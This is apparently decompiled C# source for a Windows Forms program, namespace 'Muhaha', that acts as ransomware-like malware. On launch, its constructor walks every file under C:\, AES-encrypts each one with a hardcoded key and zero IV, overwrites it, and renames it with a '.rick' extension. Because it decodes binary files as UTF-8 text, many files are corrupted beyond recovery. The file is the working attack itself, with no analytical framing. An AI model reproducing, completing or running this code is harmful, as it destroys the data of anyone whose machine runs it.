using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Muhaha;

public class Form1 : Form
{
	private static string key = "4t7w!z%C*F-JaNcR";

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
		string[] files = Directory.GetFiles("C:\\", "*.*", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				byte[] bytes = File.ReadAllBytes(text);
				string @string = Encoding.UTF8.GetString(bytes);
				string s = EncryptString(key, @string);
				byte[] bytes2 = Encoding.UTF8.GetBytes(s);
				File.WriteAllBytes(text, bytes2);
				File.Move(text, text + ".rick");
			}
			catch
			{
			}
		}
	}

	public static string EncryptString(string key, string plainText)
	{
		byte[] iV = new byte[16];
		byte[] inArray;
		using (Aes aes = Aes.Create())
		{
			aes.Key = Encoding.UTF8.GetBytes(key);
			aes.IV = iV;
			ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			using (StreamWriter streamWriter = new StreamWriter(stream))
			{
				streamWriter.Write(plainText);
			}
			inArray = memoryStream.ToArray();
		}
		return Convert.ToBase64String(inArray);
	}

	public static string DecryptString(string key, string cipherText)
	{
		byte[] iV = new byte[16];
		byte[] buffer = Convert.FromBase64String(cipherText);
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(key);
		aes.IV = iV;
		ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
		using MemoryStream stream = new MemoryStream(buffer);
		using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		using StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(803, 450));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
